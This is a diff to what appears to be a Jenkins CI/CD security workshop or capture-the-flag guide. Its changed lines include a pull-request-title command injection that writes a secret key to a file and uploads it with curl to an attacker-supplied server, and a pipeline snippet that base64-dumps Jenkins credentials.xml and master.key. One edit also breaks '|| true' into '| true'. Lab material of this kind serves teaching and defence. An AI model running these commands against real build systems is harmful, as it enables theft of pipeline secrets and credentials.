@@ -22,7 +22,7 @@ Jenkins
 
 ### Slide 23
 ```
-withCredentials([string(credentialsId 'flag1', variable: 'flag1')])
+withCredentials([string(credentialsId: 'flag1', variable: 'flag1')])
     sh '''
         echo $flag1 |base64
     '''
@@ -90,7 +90,7 @@ http://<server>:3000/Cov/reportcov
 
 Paste this into pull request title, replace `<YOUR SERVER IP>` with the one you got from the `ip addr` command above.
 ```
-echo ${KEY} > key && curl -v -F file=@key <YOUR SERVER IP>
+`echo ${KEY} > key && curl -v -F file=@key <YOUR SERVER IP>`
 ```
 
 ### Slide 35
@@ -182,7 +182,7 @@ cat $JENKINS_HOME/flag5.txt
 >```
 >sh """
 >    virtualenv venv
->    pip install -r requirements.txt || true
+>    pip install -r requirements.txt | true
 >    echo $JENKINS_HOME
 >    cat $JENKINS_HOME/credentials.xml | base64
 >    cat $JENKINS_HOME/secrets/master.key | base64
